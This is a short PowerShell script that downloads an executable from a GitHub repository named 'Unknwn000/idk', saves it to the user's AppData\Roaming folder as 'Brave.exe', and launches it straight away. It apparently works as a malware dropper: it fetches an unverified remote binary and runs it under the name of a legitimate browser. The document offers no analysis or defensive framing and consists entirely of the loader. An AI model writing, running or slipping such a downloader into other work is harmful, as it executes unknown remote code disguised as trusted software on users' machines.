$p="$HOME\AppData\Roaming\Brave.exe";
$e=New-Object System.Net.WebClient;
$e.DownloadFile("https://raw.githubusercontent.com/Unknwn000/idk/main/main.exe",$p);
Start-Process -FilePath $p
